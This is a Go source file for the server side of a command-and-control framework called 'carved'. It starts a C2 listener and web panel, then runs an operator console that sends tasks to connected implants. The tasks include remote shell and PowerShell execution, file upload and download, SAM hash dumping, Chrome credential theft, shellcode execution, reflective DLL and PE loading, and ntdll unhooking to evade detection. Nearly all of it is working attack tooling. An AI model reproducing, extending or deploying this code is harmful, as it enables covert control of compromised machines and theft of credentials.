package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/carved4/carved/server/pkg/api"
	"github.com/carved4/carved/server/pkg/db"
	"github.com/carved4/carved/server/pkg/listeners"
	"github.com/carved4/carved/server/pkg/web"
	"github.com/carved4/carved/shared/proto"
)

func main() {

	apiPort := flag.Int("port", 9000, "API server port")
	listenerPort := flag.Int("listener", 8443, "C2 listener port")
	dbPath := flag.String("db", "carved.db", "Database path")
	flag.Parse()

	fmt.Println(` ▄████▄   ▄▄▄       ██▀███   ██▒   █▓▓█████ ▓█████▄ 
▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▒██▀ ██▌
▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒ ▓██  █▒░▒███   ░██   █▌
▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ░▓█▄   ▌
▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒   ▒▀█░  ░▒████▒░▒████▓ 
░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░ ▒▒▓  ▒ 
  ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░ ░ ▒  ▒ 
░          ░   ▒     ░░   ░      ░░     ░    ░ ░  ░ 
░ ░            ░  ░   ░           ░     ░  ░   ░    
░                                ░           ░      `)

	fmt.Printf("[*] Initializing database: %s\n", *dbPath)
	if err := db.Init(*dbPath); err != nil {
		fmt.Printf("[!] Database init failed: %v\n", err)
		os.Exit(1)
	}
	defer db.Close()

	lm := listeners.NewManager()

	defaultListener := &db.Listener{
		ID:		"default",
		Name:		"default",
		Type:		"http",
		Host:		"0.0.0.0",
		Port:		uint16(*listenerPort),
		Active:		true,
		Created:	time.Now(),
	}
	lm.Start(defaultListener)

	apiServer := api.NewServer(lm)

	apiAddr := fmt.Sprintf(":%d", *apiPort)
	fmt.Printf("[*] Starting API server on %s\n", apiAddr)

	go func() {
		if err := http.ListenAndServe(apiAddr, apiServer.Router()); err != nil {
			fmt.Printf("[!] API server error: %v\n", err)
		}
	}()

	username, password := web.GetCredentials()
	
	fmt.Println("[+] Server started successfully")
	fmt.Println("")
	fmt.Printf("    Web Panel: http://0.0.0.0%s\n", apiAddr)
	fmt.Printf("    API:       http://0.0.0.0%s/api\n", apiAddr)
	fmt.Printf("    C2:        http://0.0.0.0:%d\n", *listenerPort)
	fmt.Println("")
	fmt.Println("    Access via your public IP or hostname")
	fmt.Printf("    Login: %s / %s\n", username, password)
	fmt.Println("")

	go func() {
		sigChan := make(chan os.Signal, 1)
		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
		<-sigChan
		fmt.Println("\n[*] Shutting down...")
		os.Exit(0)
	}()

	runCLI()
}

var currentImplant *db.Implant

func runCLI() {
	reader := bufio.NewReader(os.Stdin)

	for {
		prompt := "carved"
		if currentImplant != nil {
			prompt = fmt.Sprintf("carved (%s@%s)", currentImplant.Username, currentImplant.Hostname)
		}
		fmt.Printf("%s> ", prompt)

		line, err := reader.ReadString('\n')
		if err != nil {
			continue
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Fields(line)
		cmd := parts[0]
		args := parts[1:]

		switch cmd {
		case "help", "?":
			printHelp()
		case "implants", "sessions":
			listImplants()
		case "clear":
			clearImplants()
		case "use", "interact":
			if len(args) < 1 {
				fmt.Println("Usage: use <implant-id>")
				continue
			}
			useImplant(args[0])
		case "back":
			currentImplant = nil
		case "info":
			showImplantInfo()
		case "tasks":
			showTasks()
		case "shell":
			if len(args) < 1 {
				fmt.Println("Usage: shell <command>")
				continue
			}
			queueTask(proto.TaskShell, []string{strings.Join(args, " ")}, nil)
		case "powershell", "psh":
			if len(args) < 1 {
				fmt.Println("Usage: powershell <command>")
				continue
			}
			queueTask(proto.TaskPowershell, []string{strings.Join(args, " ")}, nil)
		case "ps":
			queueTask(proto.TaskPS, nil, nil)
		case "pwd":
			queueTask(proto.TaskPWD, nil, nil)
		case "cd":
			if len(args) < 1 {
				fmt.Println("Usage: cd <path>")
				continue
			}
			queueTask(proto.TaskCD, args, nil)
		case "ls":
			queueTask(proto.TaskLS, args, nil)
		case "cat":
			if len(args) < 1 {
				fmt.Println("Usage: cat <file>")
				continue
			}
			queueTask(proto.TaskCat, args, nil)
		case "upload":
			if len(args) < 2 {
				fmt.Println("Usage: upload <local-file> <remote-path>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("[-] Failed to read file: %v\n", err)
				continue
			}
			queueTask(proto.TaskUpload, []string{args[1]}, data)
		case "download":
			if len(args) < 1 {
				fmt.Println("Usage: download <remote-file>")
				continue
			}
			queueTask(proto.TaskDownload, args, nil)
		case "whoami":
			queueTask(proto.TaskWhoami, nil, nil)
		case "env":
			queueTask(proto.TaskEnv, nil, nil)
		case "hashdump":
			queueTask(proto.TaskHashdump, nil, nil)
		case "chrome":
			queueTask(proto.TaskChrome, nil, nil)
		case "unhook":
			queueTask(proto.TaskUnhook, nil, nil)
		case "sleep":
			if len(args) < 1 {
				fmt.Println("Usage: sleep <seconds> [jitter%]")
				continue
			}
			queueTask(proto.TaskSleep, args, nil)
		case "kill":
			if len(args) < 1 {
				fmt.Println("Usage: kill <pid>")
				continue
			}
			queueTask(proto.TaskKill, args, nil)
		case "execute":
			if len(args) < 1 {
				fmt.Println("Usage: execute <shellcode-file>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("[-] Failed to read shellcode: %v\n", err)
				continue
			}
			queueTask(proto.TaskExecute, nil, data)
		case "loaddll":
			if len(args) < 1 {
				fmt.Println("Usage: loaddll <dll-file>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("[-] Failed to read DLL: %v\n", err)
				continue
			}
			queueTask(proto.TaskLoadDLL, nil, data)
		case "loadpe":
			if len(args) < 1 {
				fmt.Println("Usage: loadpe <pe-file>")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				fmt.Printf("[-] Failed to read PE: %v\n", err)
				continue
			}
			queueTask(proto.TaskLoadPE, nil, data)
		case "exit", "quit":
			if currentImplant != nil {
				currentImplant = nil
			} else {
				fmt.Println("[*] Bye!")
				os.Exit(0)
			}
		default:
			fmt.Printf("Unknown command: %s (type 'help' for commands)\n", cmd)
		}
	}
}

func printHelp() {
	help := `
Commands:
  implants          - List all implants
  clear             - Clear all implants from database
  use <id>          - Interact with an implant
  back              - Deselect current implant
  info              - Show current implant info
  tasks             - Show tasks for current implant

Implant Commands (requires 'use' first):
  shell <cmd>       - Execute shell command (cmd.exe)
  powershell <cmd>  - Execute PowerShell command
  ps                - List processes
  pwd               - Print working directory
  cd <path>         - Change directory
  ls [path]         - List directory
  cat <file>        - Read file
  upload <l> <r>    - Upload local file to remote path
  download <file>   - Download file
  whoami            - Current user info
  env               - Environment variables
  sleep <s> [j%]    - Set sleep time and jitter
  kill <pid>        - Kill process

Credential Extraction:
  hashdump          - Dump SAM/SYSTEM hashes
  chrome            - Extract Chrome credentials

Execution:
  execute <file>    - Execute shellcode
  loaddll <file>    - Reflective DLL load
  loadpe <file>     - Reflective PE load

Evasion:
  unhook            - Unhook ntdll.dll

  exit/quit         - Exit (or deselect implant)
`
	fmt.Println(help)
}

func listImplants() {
	implants, err := db.GetAllImplants()
	if err != nil {
		fmt.Printf("[-] Database error: %v\n", err)
		return
	}

	if len(implants) == 0 {
		fmt.Println("[*] No implants connected")
		return
	}

	fmt.Println("")
	fmt.Printf("%-36s %-12s %-12s %-6s %-5s %-12s\n", "ID", "USER", "HOST", "PID", "ELEV", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 90))
	for _, i := range implants {
		admin := " "
		if i.Elevated {
			admin = "*"
		}
		lastSeen := i.LastSeen.Format("15:04:05")

		fmt.Printf("%-36s %-12s %-12s %-6d %-5s %-12s\n",
			i.ID, truncate(i.Username, 12), truncate(i.Hostname, 12), i.PID, admin, lastSeen)
	}
	fmt.Println("")
}

func clearImplants() {
	if err := db.ClearImplants(); err != nil {
		fmt.Printf("[-] Failed to clear implants: %v\n", err)
		return
	}
	currentImplant = nil
	fmt.Println("[+] Cleared all implants and tasks from database")
}

func truncate(s string, max int) string {
	if len(s) > max {
		return s[:max-1] + "…"
	}
	return s
}

func useImplant(id string) {
	implants, err := db.GetAllImplants()
	if err != nil {
		fmt.Printf("[-] Database error: %v\n", err)
		return
	}
	if len(implants) == 0 {
		fmt.Println("[-] No implants in database")
		return
	}

	id = strings.ToLower(strings.TrimSpace(id))
	for _, i := range implants {

		if strings.HasPrefix(strings.ToLower(i.ID), id) || strings.ToLower(i.ID) == id {
			currentImplant = i
			fmt.Printf("[+] Interacting with %s@%s (%s)\n", i.Username, i.Hostname, i.ID[:8])
			return
		}
	}

	fmt.Printf("[-] Implant not found: %s\n", id)
	fmt.Println("[*] Available implants:")
	for _, i := range implants {
		fmt.Printf("    %s  %s@%s\n", i.ID[:8], i.Username, i.Hostname)
	}
}

func showImplantInfo() {
	if currentImplant == nil {
		fmt.Println("[-] No implant selected (use 'use <id>')")
		return
	}
	i := currentImplant
	fmt.Printf(`
Implant Info:
  ID:        %s
  Hostname:  %s
  Username:  %s
  Domain:    %s
  OS:        %s/%s
  PID:       %d
  Process:   %s
  Elevated:  %v
  Sleep:     %ds (jitter: %d%%)
  First:     %s
  Last:      %s
`,
		i.ID, i.Hostname, i.Username, i.Domain, i.OS, i.Arch,
		i.PID, i.Process, i.Elevated, i.Sleep, i.Jitter,
		i.FirstSeen.Format("2006-01-02 15:04:05"),
		i.LastSeen.Format("2006-01-02 15:04:05"))
}

func showTasks() {
	if currentImplant == nil {
		fmt.Println("[-] No implant selected")
		return
	}
	tasks, err := db.GetTasksForImplant(currentImplant.ID)
	if err != nil {
		fmt.Printf("[-] Error: %v\n", err)
		return
	}
	if len(tasks) == 0 {
		fmt.Println("[*] No tasks")
		return
	}

	fmt.Println("")
	for _, t := range tasks {
		fmt.Printf("[%s] %s - %s\n", t.ID[:8], t.Type, t.Status)
		if len(t.Output) > 0 {
			fmt.Printf("%s\n", string(t.Output))
		}
		if t.Error != "" {
			fmt.Printf("Error: %s\n", t.Error)
		}
		fmt.Println("")
	}
}

func queueTask(taskType proto.TaskType, args []string, data []byte) {
	if currentImplant == nil {
		fmt.Println("[-] No implant selected (use 'use <id>')")
		return
	}

	task, err := db.CreateTask(currentImplant.ID, taskType, args, data)
	if err != nil {
		fmt.Printf("[-] Failed to create task: %v\n", err)
		return
	}
	fmt.Printf("[+] Task queued: %s\n", task.ID[:8])
}

